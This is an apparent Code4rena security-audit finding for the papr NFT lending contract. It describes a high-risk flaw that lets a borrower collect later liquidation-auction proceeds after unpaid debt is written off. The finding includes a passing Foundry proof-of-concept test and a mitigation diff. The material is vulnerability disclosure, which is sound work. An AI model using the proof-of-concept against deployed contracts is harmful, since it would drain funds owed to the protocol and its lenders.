## Tags

- bug
- 3 (High Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- edited-by-warden
- H-01

# [Borrowers may earn auction proceeds without filling the debt shortfall](https://github.com/code-423n4/2022-12-backed-findings/issues/97) 

# Lines of code

https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264-L294


# Vulnerability details

## Impact
The proceeds from the collateral auctions will not be used to fill the debt shortfall, but be transferred directly to the borrower.

## Proof of Concept

Assume N is an allowed NFT, B is a borrower, the vault V is `_vaultInfo[B][N]`:

1. B add two NFTs(N-1 and N-2) as collaterals to vault V.
2. B [increaseDebt()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L138) of vault V.
3. The vault V becomes liquidatable
4. Someone calls [startLiquidationAuction()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297) to liquidate collateral N-1.
5. No one buys N-1 because the price of N is falling
6. After [liquidationAuctionMinSpacing - 2days](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L41), someone calls [startLiquidationAuction()](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L297) to liquidate collateral N-2
7. Someone calls [purchaseLiquidationAuctionNFT](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264) to purchase N-1. Partial of the debt is filled, while the remaining (shortfall) is burnt:
  ```solidity
  if (isLastCollateral && remaining != 0) {
      /// there will be debt left with no NFTs, set it to 0
      _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);
  }
  ```
8. Someone calls [purchaseLiquidationAuctionNFT](https://github.com/with-backed/papr/blob/9528f2711ff0c1522076b9f93fba13f88d5bd5e6/src/PaprController.sol#L264) to purchase N-2. All the excess will be transferred to B because `neededToSaveVault` is 0 and `debtCached` is 0:
  ```solidity
  if (excess > 0) {
      remaining = _handleExcess(excess, neededToSaveVault, debtCached, auction);
  }
  ```

**The tokens being transferred to the borrower in step 8 should be used to fill the shortfall of the vault.**
Test code for PoC:
```solidity
diff --git a/test/paprController/PoC.sol b/test/paprController/PoC.sol
new file mode 100644
index 0000000..0b12914
--- /dev/null
+++ b/test/paprController/PoC.sol
@@ -0,0 +1,147 @@
+// SPDX-License-Identifier: GPL-2.0-or-later
+pragma solidity ^0.8.17;
+
+import "forge-std/console.sol";
+import {ERC721} from "solmate/tokens/ERC721.sol";
+
+import {ReservoirOracleUnderwriter} from "../../src/ReservoirOracleUnderwriter.sol";
+import {INFTEDA} from "../../src/NFTEDA/extensions/NFTEDAStarterIncentive.sol";
+
+import {BasePaprControllerTest} from "./BasePaprController.ft.sol";
+import {IPaprController} from "../../src/interfaces/IPaprController.sol";
+
+contract PoC is BasePaprControllerTest {
+    event ReduceDebt(address indexed account, ERC721 indexed collateralAddress, uint256 amount);
+    event Transfer(address indexed from, address indexed to, uint256 amount);
+
+    INFTEDA.Auction auction1;
+    INFTEDA.Auction auction2;
+    address purchaser = address(2);
+
+    function setUp() public override {
+        super.setUp();
+
+        // mint a second collateral
+        nft.mint(borrower, collateralId+1);
+        // add collaterals, loan max and sells
+        _addCollaterals();
+        _loanMaxAndSell();
+        // borrower now has 2.9... USD
+        assertGt(underlying.balanceOf(borrower), 2.9e6);
+
+        // prepare purchaser
+        vm.startPrank(purchaser);
+        safeTransferReceivedArgs.debt = controller.maxDebt(oraclePrice) - 10;
+        safeTransferReceivedArgs.proceedsTo = purchaser;
+        safeTransferReceivedArgs.swapParams.minOut = 0;
+        for (uint i = 0; i < 3; i ++) {
+            nft.mint(purchaser, 10+i);
+            nft.safeTransferFrom(purchaser, address(controller), 10+i, abi.encode(safeTransferReceivedArgs));
+        }
+        vm.stopPrank();
+        // purchaser now has 4.4... papr
+        assertGt(debtToken.balanceOf(purchaser), 4.4e18);
+
+        // make max loan liquidatable
+        vm.warp(block.timestamp + 1 days);
+        priceKind = ReservoirOracleUnderwriter.PriceKind.TWAP;
+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);
+    }
+
+    function testPoC() public {
+        vm.startPrank(purchaser);
+        debtToken.approve(address(controller), type(uint256).max);
+
+        // start auction1, collateralId
+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);
+        auction1 = controller.startLiquidationAuction(borrower, collateral, oracleInfo);
+
+        // nobody purchage auction1 for some reason(like nft price falling)
+
+        // start auction2, collateralId+1
+        vm.warp(block.timestamp + controller.liquidationAuctionMinSpacing());
+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);
+        auction2 = controller.startLiquidationAuction(
+            borrower, IPaprController.Collateral({id: collateralId+1, addr: nft}),  oracleInfo);
+
+        IPaprController.VaultInfo memory info = controller.vaultInfo(borrower, collateral.addr);
+        assertGt(info.debt, 2.99e18);
+
+        // purchase auction1
+        uint256 beforeBalance = debtToken.balanceOf(borrower);
+        uint256 price = controller.auctionCurrentPrice(auction1);
+        uint256 penalty = price * controller.liquidationPenaltyBips() / 1e4;
+        uint256 reduced = price - penalty;
+        uint256 shortfall = info.debt - reduced;
+        // burn penalty
+        vm.expectEmit(true, true, false, true);
+        emit Transfer(address(controller), address(0), penalty);
+        // reduce debt (partial)
+        vm.expectEmit(true, false, false, true);
+        emit ReduceDebt(borrower, collateral.addr, reduced);
+        vm.expectEmit(true, true, false, true);
+        emit Transfer(address(controller), address(0), reduced);
+        //!! burning the shortfall debt not covered by auction
+        vm.expectEmit(true, false, false, true);
+        emit ReduceDebt(borrower, collateral.addr, shortfall);
+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);
+        controller.purchaseLiquidationAuctionNFT(auction1, price, purchaser, oracleInfo);
+
+        // reduced: 0.65..
+        assertLt(reduced, 0.66e18);
+        // fortfall: 2.34..
+        assertGt(shortfall, 2.34e18);
+        //!! debt is 0 now
+        info = controller.vaultInfo(borrower, collateral.addr);
+        assertEq(info.debt, 0);
+
+        // purchase auction2
+        // https://www.wolframalpha.com/input?i=solve+3+%3D+8.999+*+0.3+%5E+%28x+%2F+86400%29
+        vm.warp(block.timestamp + 78831);
+        beforeBalance = debtToken.balanceOf(borrower);
+        price = controller.auctionCurrentPrice(auction2);
+        penalty = price * controller.liquidationPenaltyBips() / 1e4;
+        uint256 payouts = price - penalty;
+        // burn penalty
+        vm.expectEmit(true, true, false, true);
+        emit Transfer(address(controller), address(0), penalty);
+        //!! reduce 0 because debt is 0
+        vm.expectEmit(true, false, false, true);
+        emit ReduceDebt(borrower, collateral.addr, 0);
+        vm.expectEmit(true, true, false, true);
+        emit Transfer(address(controller), address(0), 0);
+        //!! borrower get the payouts that should be used to reduce the shortfall debt
+        vm.expectEmit(true, true, false, true);
+        emit Transfer(address(controller), borrower, payouts);
+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);
+        controller.purchaseLiquidationAuctionNFT(auction2, price, purchaser, oracleInfo);
+
+        //!! borrower wins
+        uint256 afterBalance = debtToken.balanceOf(borrower);
+        assertEq(afterBalance - beforeBalance, payouts);
+        assertGt(payouts, 2.4e18);
+    }
+
+    function _addCollaterals() internal {
+        vm.startPrank(borrower);
+        nft.setApprovalForAll(address(controller), true);
+        IPaprController.Collateral[] memory c = new IPaprController.Collateral[](2);
+        c[0] = collateral;
+        c[1] = IPaprController.Collateral({id: collateralId+1, addr: nft});
+        controller.addCollateral(c);
+        vm.stopPrank();
+    }
+
+    function _loanMaxAndSell() internal {
+        oracleInfo = _getOracleInfoForCollateral(collateral.addr, underlying);
+        IPaprController.SwapParams memory swapParams = IPaprController.SwapParams({
+            amount: controller.maxDebt(oraclePrice*2) - 4,
+            minOut: 1,
+            sqrtPriceLimitX96: _maxSqrtPriceLimit({sellingPAPR: true}),
+            swapFeeTo: address(0),
+            swapFeeBips: 0
+        });
+        vm.prank(borrower);
+        controller.increaseDebtAndSell(borrower, collateral.addr, swapParams, oracleInfo);
+    }
+}
```

Test output:
```
Running 1 test for test/paprController/PoC.sol:PoC
[PASS] testPoC() (gas: 720941)
Test result: ok. 1 passed; 0 failed; finished in 1.21s
```

## Tools Used
VS Code

## Recommended Mitigation Steps

The debt shortfall should be recorded and accumulated when the debt is burnt directly. Fill the shortfall first in later liquidation.

Implementation code:
```solidity
diff --git a/src/PaprController.sol b/src/PaprController.sol
index 284b3f4..d7e4cea 100644
--- a/src/PaprController.sol
+++ b/src/PaprController.sol
@@ -61,6 +61,8 @@ contract PaprController is

     /// @dev account => asset => vaultInfo
     mapping(address => mapping(ERC721 => IPaprController.VaultInfo)) private _vaultInfo;
+    /// @dev account => asset => shortfall amount
+    mapping(address => mapping(ERC721 => uint256)) private _shortfall;

     /// @dev does not validate args
     /// e.g. does not check whether underlying or oracleSigner are address(0)
@@ -288,6 +290,8 @@ contract PaprController is
         }

         if (isLastCollateral && remaining != 0) {
+            // increase shortfall
+            _shortfall[auction.nftOwner][auction.auctionAssetContract] += remaining;
             /// there will be debt left with no NFTs, set it to 0
             _reduceDebtWithoutBurn(auction.nftOwner, auction.auctionAssetContract, remaining);
         }
@@ -408,6 +412,10 @@ contract PaprController is
         return _vaultInfo[account][asset];
     }

+    function shortfall(address account, ERC721 asset) external view returns (uint256) {
+        return _shortfall[account][asset];
+    }
+
     /// INTERNAL NON-VIEW ///

     function _addCollateralToVault(address account, IPaprController.Collateral memory collateral) internal {
@@ -543,7 +551,20 @@ contract PaprController is
             // we owe them more papr than they have in debt
             // so we pay down debt and send them the rest
             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), debtCached);
-            papr.transfer(auction.nftOwner, totalOwed - debtCached);
+
+            uint256 payout = totalOwed - debtCached;
+            uint256 burnShortfall = _shortfall[auction.nftOwner][auction.auctionAssetContract];
+            if (burnShortfall >= payout) {
+                burnShortfall = payout;
+            }
+            if (burnShortfall > 0) {
+                // burn the previous shortfall
+                PaprToken(address(papr)).burn(address(this), burnShortfall);
+                _shortfall[auction.nftOwner][auction.auctionAssetContract] -= burnShortfall;
+            }
+            if (payout > burnShortfall) {
+                papr.transfer(auction.nftOwner, payout - burnShortfall);
+            }
         } else {
             // reduce vault debt
             _reduceDebt(auction.nftOwner, auction.auctionAssetContract, address(this), totalOwed);
```
